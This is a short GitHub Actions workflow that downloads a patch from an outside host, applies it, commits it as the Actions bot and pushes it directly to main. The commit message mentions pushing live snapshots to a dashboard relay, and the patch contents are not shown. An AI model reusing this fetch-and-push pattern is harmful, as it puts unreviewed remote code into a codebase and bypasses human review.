name: Apply live sync patch

on:
  workflow_dispatch:

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Apply patch
        run: |
          curl -fsSL https://hive-station-s7w6pq.freebuff.site/hive-live-sync.patch -o /tmp/live.patch
          git apply --whitespace=nowarn /tmp/live.patch
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git diff --cached --stat
          git commit -m "feat: push live snapshots to the dashboard relay"
          git push origin HEAD:main
